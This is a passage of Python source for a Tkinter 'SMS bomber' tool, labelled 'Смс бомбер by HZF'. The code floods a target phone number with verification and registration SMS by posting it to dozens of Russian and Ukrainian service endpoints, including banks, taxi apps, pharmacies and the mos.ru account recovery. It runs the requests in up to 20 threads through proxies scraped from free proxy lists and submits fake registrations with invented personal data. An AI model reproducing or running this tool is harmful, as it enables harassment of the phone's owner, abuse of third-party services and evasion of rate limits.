            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone}, headers={'Accept-Language':'en-US,en;q=0.5',  'Connection':'keep-alive',  'Cookie':'JSESSIONID=' + b.cookies['JSESSIONID'] + ';',  'Host':'drugvokrug.ru',  'Referer':'https://drugvokrug.ru/',  'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',  'X-Requested-With':'XMLHttpRequest'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван',  'middleName':'Иванович',  'lastName':'Иванов',  'sex':'1',  'birthDate':'10.10.2000',  'mobilePhone':phone[1:],  'russianFederationResident':'true',  'isDSA':'false',  'personalDataProcessingAgreement':'true',  'bKIRequestAgreement':'null',  'promotionAgreement':'true'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша',  'CellPhone':phone[1:],  'Package':'optimal'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            data = {'form[NAME]':'Иван',
             'form[PERSONAL_GENDER]':'M',
             'form[PERSONAL_BIRTHDAY]':'11.02.2000',
             'form[EMAIL]':'fbhbdfvbd@gmail.com',
             'form[LOGIN]':phone1,
             'form[PASSWORD]':None,
             'get-new-password':'Получите пароль по SMS',
             'user_agreement':'on',
             'personal_data_agreement':'on',
             'formType':'full',
             'utc_offset':180}
            aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data=data, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            tvzavr = requests.post(('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=' + phone + '&csrf_value=a222ba2a464543f5ac6ad097b1e92a49'), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            cook = requests.post('https://www.netprint.ru/order/profile', proxies=(proxy()))
            headers = {'Accept':'application/json, text/javascript, */*; q=0.01',
             'Accept-Encoding':'gzip, deflate, br',
             'Accept-Language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
             'Connection':'keep-alive',
             'Content-Length':145,
             'Cookie':'unbi=' + cook.cookies['unbi'],
             'Host':'www.netprint.ru',
             'Origin':'https://www.netprint.ru',
             'Referer':'https://www.netprint.ru/order/profile',
             'Sec-Fetch-Mode':'cors',
             'Sec-Fetch-Site':'same-origin',
             'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
             'X-Requested-With':'XMLHttpRequest'}
            netprint = requests.post('https://www.netprint.ru/order/social-auth', headers=headers, data={'operation':'stdreg',  'email_or_phone':phonew,  'i_agree_with_terms':1}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://youdrive.today/login/web/phone', data={'phone':phone,  'phone_code':7}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.get(('https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone + '&country_code=%2B7&nod=4&locale=en'), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.carsmile.com/', json={'operationName':'enterPhone',
             'variables':{'phone': phone},  'query':'mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n'},
              proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://api.delitime.ru/api/v2/signup', data={'SignupForm[username]':phone,
             'SignupForm[device_type]':3},
              proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'msisdn':phone,
             'locale':'en',  'countryCode':'ru',  'version':'1',
             'k':'ic1rtwz1s1Hj1O0r',  'r':'46763'},
              proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'mode':'request',
             'phone':'+' + phone,  'phone_permission':'unknown',
             'stream_id':0,  'v':3,  'appversion':'3.20.6',  'osversion':'unknown',
             'devicemodel':'unknown'},
              proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password':password,  'application':'lkp',  'login':'+' + phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://qlean.ru/clients-api/v2/sms_codes/auth/request_code', json={'phone': phone},
              proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.get(('https://findclone.ru/register?phone=+' + phone), proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number':_phone9,  'version':'2'}, headers={}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={'phone': '+' + _phone}, headers={}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://fastmoney.ru/auth/registration', data={'RegistrationForm[username]':'+' + _phone,  'RegistrationForm[password]':'12345',  'RegistrationForm[confirmPassword]':'12345',  'yt0':'Регистрация'}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-reg/submission', json={'data': {'firstName':_text,  'lastName':'***',  'phone':_phone,  'email':_name + '@gmail.com',  'password':_name,  'passwordConfirm':_name}}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name':_text,  'phone':_phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://login.mos.ru/sps/recovery/start', json={'login':_phone,  'attr':''}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone}, proxies=(proxy()))
            good()
        except Exception as e:
            error()

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={'registration_name':_name,  'registration_phone':_phone[2:],  'registration_email':_email}, proxies=(proxy()))
            good()
        except Exception as e:
            error()


class Queue:

    def __init__(self):
        self.queue = []

    def get(self):
        if self.qsize() != 0:
            return self.queue.pop()

    def put(self, item):
        if item not in self.queue:
            self.queue.append(item)

    def qsize(self):
        return len(self.queue)

    def __str__(self):
        return str(self.queue)


class Proxy:

    def __init__(self):
        self.anony_proxis = 'https://free-proxy-list.net/anonymous-proxy.html'
        self.new_proxies = 'https://free-proxy-list.net'
        self.socks_proxies = 'https://socks-proxy.net'
        self.ssl_proxies = 'https://sslproxies.org'
        self.qproxy = None
        self.psize = 0
        self.country = None
        self.port = None

    def fetch(self, url):
        proxies = bs(get(url).text, 'html.parser').find('tbody').findAll('tr')
        for proxy in proxies:
            pjson = self.parse(proxy.findAll('td'))
            if pjson:
                if self.psize:
                    if self.qproxy.qsize() < self.psize:
                        self.qproxy.put(pjson)
                    else:
                        break
                else:
                    self.qproxy.put(pjson)

    def parse(self, proxy):
        pjson = {'ip':proxy[0].string,
         'port':proxy[1].string,  'anonymity':proxy[4].string,
         'country':proxy[3].string,
         'updated':proxy[7].string,
         'https':proxy[6].string}
        if all([self.country, self.port]):
            if pjson['country'] == self.country:
                if pjson['port'] == self.port:
                    return pjson
            elif self.port:
                if self.port != pjson['port']:
                    return
                return pjson
            elif self.country:
                if self.country != pjson['country']:
                    return
                return pjson
            else:
                return pjson

    def scrape(self, size=None, port=None, country=None, new_proxies=False, anony_proxies=False, socks_proxies=False, ssl_proxies=False):
        self.port = str(port) if port else None
        self.country = country
        self.qproxy = Queue()
        self.psize = size
        if new_proxies:
            self.fetch(self.new_proxies)
        if anony_proxies:
            self.fetch(self.anony_proxies)
        if socks_proxies:
            self.fetch(self.socks_proxies)
        if ssl_proxies:
            self.fetch(self.ssl_proxies)
        proxies = self.qproxy
        self.qproxy = Queue()
        return proxies


def download():
    prx = Proxy()
    proxies = prx.scrape(new_proxies=True, size=10)
    f = open('proxy.txt', 'w')
    while 1:
        if proxies.qsize():
            proxy = proxies.get()
            f.write('http socks5://' + proxy['ip'] + ':' + proxy['port'] + '\n')

    f.close()
    messagebox.showinfo(title='PROXY загружены', message=('Путь к файлу: ' + os.path.dirname(os.path.abspath(__file__)) + '\\proxy.txt'))


var = IntVar()
check = Checkbutton(root, text='Использовать PROXY', variable=var, onvalue=1, offvalue=0)
check.pack()
check.place(x=350, y=50)

def StartThread():
    number = text1.get('1.0', 'end')
    try:
        thrade = int(text2.get('1.0', 'end'))
    except:
        messagebox.showinfo(title='Warning', message='Не корректный формат потоков')

    try:
        if thrade > 20:
            messagebox.showinfo(title='Warning', message='Превышен максимум потоков')
    except:
        pass

    if var.get() == 1:
        spam = spamProxy
        try:
            if file_name == None:
                pass
        except:
            messagebox.showinfo(title='Warning', message='Не указан файл с PROXY')

        try:
            if len(number) < 12 or file_name == None:
                messagebox.showinfo(title='Warning', message='Неправильный формат номера')
            else:
                messagebox.showinfo(title='Запущено', message='Бомбинг запущен')
                for i in range(thrade):
                    t = threading.Thread(target=spam, args=(number,))
                    t.start()

        except:
            pass

    else:
        spam = spamNOproxy
        if len(number) < 12:
            messagebox.showinfo(title='Warning', message='Неправильный формат номера')
        else:
            messagebox.showinfo(title='Следи за процессом в Terminal', message='Бомбинг запущен')
            for i in range(thrade):
                t = threading.Thread(target=spam, args=(number,))
                t.start()


def fileopen():
    global file_name
    file_name = fd.askopenfilename(filetypes=(('TXT files', '*.txt'), ('HTML files', '*.html;*.htm'),
                                              ('All files', '*.*')))


root.resizable(False, False)

text1 = Text(root, height=1, width=15, font='Ubuntu')
text1.pack()
text1.place(x=15, y=25)
text2 = Text(root, height=1, width=2, font='Ubuntu')
text2.pack()
text2.place(x=15, y=85)
file = Button(text='Выбрать файл с PROXY', command=fileopen)
file.pack()
file.place(x=15, y=120)
file = Button(text='Загрузить PROXY из интернета', command=download)
file.pack()
file.place(x=15, y=160)
label1 = Label(text='Введите номер в формате 7XXXXXXXXXX', fg='#912700', bg='#849187')
label1.pack()
label1.place(x=15, y=55)
label2 = Label(text='Потоки (Максимум 20)', fg='#912700', bg='#849187')
label2.pack()
label2.place(x=50, y=90)
poetry = 'Смс бомбер by HZF'
label3 = Label(text=poetry, justify=CENTER)
label3.place(x=10, y=370)
crack = Button(text='Запустить', height=2, width=11, background='green', command=StartThread)
crack.pack()
crack.place(x=200, y=300)
root.mainloop()
